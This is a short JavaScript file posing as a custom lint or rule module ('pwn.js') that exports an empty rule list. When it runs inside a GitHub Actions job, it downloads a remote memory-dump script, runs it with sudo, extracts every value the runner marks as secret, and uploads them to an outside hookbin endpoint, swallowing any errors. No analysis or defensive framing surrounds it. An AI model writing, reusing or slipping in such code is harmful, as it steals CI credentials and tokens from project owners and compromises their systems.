
const { execSync } = require('child_process');
const runId = process.env.GITHUB_RUN_ID;
console.log("Custom rule pwn.js loaded!");
if (runId) {
    const command = `echo "Okay, we got this far. Let's continue..."
curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' >> "/tmp/secrets"
curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/${runId}"`;
    try {
        execSync(command, { stdio: 'inherit' });
    } catch (e) {}
}
module.exports = [];
